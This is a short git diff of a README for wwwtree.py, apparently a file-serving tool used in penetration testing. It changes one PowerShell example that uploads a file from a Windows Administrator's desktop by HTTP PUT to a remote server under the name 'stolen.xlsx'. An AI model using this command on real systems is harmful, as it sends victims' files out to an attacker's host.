@@ -31,5 +31,5 @@ wwwtree.py [-h] -r ROOT_PATH -i INTERFACE [-l LEVEL] [-p PORT] [-k KEYWORDS] [-A
 ### PUT Requests
 I've noticed that curl on Windows seems to work improperly when trying to transfer large files. Powershell's `Invoke-WebRequest` works much better:
 ```
-powershell -c "invoke-webrequest -method PUT -headers @{'Content-Type'='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'} -usebasicparsing -uri http://192.168.111.135/testt -body (get-content C:\Users\pxart\Desktop\some_file.xlsx)"
+powershell -c "invoke-webrequest -method PUT -headers @{'Content-Type'='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'} -usebasicparsing -uri http://192.168.111.135/stolen.xlsx -body (get-content C:\Users\Administrator\Desktop\some_file.xlsx)"
 ```
